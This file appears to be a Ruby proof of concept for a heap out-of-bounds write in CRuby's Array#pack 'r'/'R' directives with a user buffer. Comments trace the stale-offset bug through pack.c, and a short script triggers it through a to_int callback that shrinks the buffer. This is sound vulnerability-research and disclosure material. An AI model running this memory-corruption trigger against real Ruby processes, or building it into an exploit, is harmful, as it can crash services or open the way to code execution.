# H14/H137 — Array#pack('r'|'R', buffer:) heap OOB write via reentrant element to_int.
#
# pack_pack (pack.c:768 'r'/SLEB128, 'R'/ULEB128 directive):
#   const long start = RSTRING_LEN(res);       // pack.c:781  cache output end
#   from = NEXTFROM;                            // pack.c:783
#   from = rb_to_int(from);                     // pack.c:784  USER CODE (element to_int)
#         => buffer.replace(short)  -> res (== the user buffer:) shrinks/reallocs; `start` now stale
#   rb_str_modify_expand(res, numbytes+extra);  // pack.c:797  room for numbytes beyond NEW len
#   cp = RSTRING_PTR(res) + start;              // pack.c:799  cp = base + STALE start (past buffer)
#   rb_integer_pack(from, cp, numbytes, ...);   // pack.c:800  -> bary_pack writes at cp => OOB WRITE
#
# res is the user-supplied buffer: string (pack.c:358 `res = buffer`), so the element's
# to_int can mutate it. The existing pack guards (MORE_ITEM re-reads RARRAY_LEN; the
# "format string modified" check at pack.c:374) protect the SOURCE array and FORMAT, not
# the OUTPUT buffer `res` across rb_to_int. Only the 'r'/'R' LEB128 directives cache a raw
# `start`/`cp` around the element conversion; other integer directives cat via rb_str_buf_cat
# (which re-fetches res).

buf = "Z" * 4096
$buf = buf
evil = Object.new
def evil.to_int
  $buf.replace("q")     # shrink res mid-pack; start(=4096) now points past the buffer
  123456789             # multi-byte SLEB128 -> rb_integer_pack writes numbytes at res+4096
end

[evil].pack("r", buffer: buf)
puts "no crash"
